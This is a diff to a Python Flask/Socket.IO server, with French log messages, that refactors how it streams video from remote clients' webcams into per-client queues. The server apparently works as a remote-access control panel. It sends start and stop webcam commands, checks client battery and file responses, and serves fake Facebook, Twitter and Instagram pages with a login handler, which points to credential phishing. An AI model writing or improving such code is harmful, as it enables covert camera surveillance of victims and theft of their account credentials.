@@ -25,9 +25,8 @@ app.config['DEBUG'] = True
 db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
-video_frames = Queue()
+video_frames = {}
 battery_status = {}
-stop_streaming = False
 
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=50 ** 8)
 
@@ -381,7 +380,7 @@ class StopWebcam(Resource):
         if client.status == 'offline':
             return {'status': 'error', 'message': 'Client hors ligne.'}, 400
 
-        socketio.emit('stop_stream', room=client.sid)
+        socketio.emit('stop_stream', {'user_id': client_id}, room=client.sid)
         return {'status': 'success', 'message': 'Commande pour arrêter la webcam envoyée.'}, 200
 
 
@@ -400,10 +399,9 @@ class StreamWebcam(Resource):
             return {'status': 'error', 'message': 'La caméra ne peut pas être activée car la batterie est inférieure '
                                                   'à 20% et non branchée.'}, 400
 
-        global stop_streaming
-        stop_streaming = False
-        socketio.emit('start_stream', room=client.sid)
-        return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+        app.logger.info(f"Envoi de l'événement start_stream pour l'utilisateur {client_id}.")
+        socketio.emit('start_stream', {'user_id': client_id}, room=client.sid)
+        return Response(stream_frames(client_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
 @directory_ns.route('/client/<int:client_id>')
@@ -626,15 +624,29 @@ def handle_battery_status(data):
 
 @socketio.on('webcam_response')
 def handle_frame(data):
+    user_id = data.get('user_id')
     frame_data = base64.b64decode(data.get('data'))
-    video_frames.put(frame_data)
+    if user_id not in video_frames:
+        video_frames[user_id] = Queue()
+    video_frames[user_id].put(frame_data)
+
+
+@socketio.on('start_stream')
+def handle_start_stream(data):
+    user_id = data.get('user_id')
+    app.logger.info(f"Démarrage du streaming pour l'utilisateur {user_id}.")
+    if user_id not in video_frames:
+        video_frames[user_id] = Queue()
+    else:
+        app.logger.info(f"L'utilisateur {user_id} est déjà dans video_frames.")
 
 
 @socketio.on('stop_stream')
-def handle_stop_stream():
-    global stop_streaming
-    stop_streaming = True
-    app.logger.info("Arrêt du streaming demandé par le client.")
+def handle_stop_stream(data):
+    user_id = data.get('user_id')
+    app.logger.info(f"Arrêt du streaming pour l'utilisateur {user_id}.")
+    if user_id in video_frames:
+        del video_frames[user_id]
 
 
 @socketio.on('file_response')
@@ -678,32 +690,43 @@ def handle_disconnect():
         app.logger.info(f"Client déconnecté: {client.ip}")
 
 
-def stream_frames():
-    global stop_streaming
-    while not stop_streaming:
+def stream_frames(user_id):
+    time.sleep(1)
+
+    while True:
         try:
-            frame_data = video_frames.get(timeout=1)
+            if user_id not in video_frames:
+                app.logger.error(f"Utilisateur {user_id} non trouvé dans video_frames.")
+                break
+            frame_data = video_frames[user_id].get(timeout=1)
             yield (b'--frame\r\n'
                    b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
         except Empty:
             continue
+        except Exception as e:
+            app.logger.error(f"Erreur dans stream_frames: {e}")
+            break
 
 
 @app.route('/')
 def home():
     return redirect(url_for('fake_facebook'))
 
+
 @app.route('/facebook')
 def fake_facebook():
     return render_template('facebook.html')
+
 
 @app.route('/twitter')
 def fake_twitter():
     return render_template('twitter.html')
 
+
 @app.route('/instagram')
 def fake_instagram():
     return render_template('instagram.html')
+
 
 @app.route('/login', methods=['POST'])
 def login():
